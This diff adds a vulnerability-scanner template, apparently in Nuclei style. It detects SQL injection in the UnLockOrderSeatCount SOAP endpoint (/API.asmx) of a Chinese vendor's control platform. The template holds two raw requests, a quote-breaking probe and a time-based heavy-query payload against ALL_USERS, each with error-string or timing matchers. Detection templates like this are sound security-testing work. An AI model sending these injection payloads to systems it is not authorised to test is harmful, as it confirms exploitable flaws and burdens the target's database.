@@ -1,0 +1,77 @@
+id: poc-yaml-sendinfo-control-platform-server-unlockorderseatcount-sqli
+info:
+  name: 深大智能科技有限公司管控平台服务端 UnLockOrderSeatCount SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 深大智能科技有限公司管控平台服务端
+  description: |
+    This template detects SQL injection vulnerabilities in the UnLockOrderSeatCount service of 深大智能科技有限公司管控平台服务端.
+http:
+  - raw:
+      - |
+        POST /API.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/UnLockOrderSeatCount"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UnLockOrderSeatCount xmlns="http://tempuri.org/">
+              <fo>'</fo>
+              <ft>string</ft>
+            </UnLockOrderSeatCount>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "引号内的字符串没有正确结束"
+          - "UnLockOrderSeatCountResponse"
+          - "UnLockOrderSeatCountResult"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /API.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/UnLockOrderSeatCount"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UnLockOrderSeatCount xmlns="http://tempuri.org/">
+              <fo>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- AodC</fo>
+              <ft>string</ft>
+            </UnLockOrderSeatCount>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "找到数量预订并且未出票的该订单"
+          - "UnLockOrderSeatCountResponse"
+          - "UnLockOrderSeatCountResult"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > 5"
+          - "duration < 8"
